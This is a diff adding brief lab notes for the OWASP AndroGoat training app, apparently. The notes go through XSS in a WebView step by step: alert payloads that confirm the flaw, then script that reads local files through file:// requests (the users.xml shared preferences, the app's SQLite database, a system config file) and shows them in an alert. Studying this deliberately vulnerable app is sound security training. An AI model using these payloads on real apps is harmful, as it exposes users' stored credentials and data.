@@ -1,0 +1,19 @@
+Step 1 :
+create sharedpref + sqlite data
+
+Step 2: Confirming the XSS vulnerability
+<h1>hello</h1>
+<img sc=x onerror=alert(1)> or <script>alert(1)</script>
+
+Step 3: Confirming Execution Context
+<script>alert(location)</script> 
+
+Step 4: Data Exfiltration via XSS - Stealing App Files
+<script>a=new XMLHttpRequest();a.open("GET", "file:///data/data/owasp.sat.agoat/shared_prefs/users.xml",false);a.send();alert(a.responseText);</script>
+
+<script>a=new XMLHttpRequest();a.open("GET", "file:///data/data/owasp.sat.agoat/databases/aGoat",false);a.send() ;alert (a.responseText);</script>
+
+<script>a=new XMLHttpRequest();a.open("GET", "file:///system/etc/custom.conf", false);a.send() ;alert(a.responseText);</script>
+
+
+
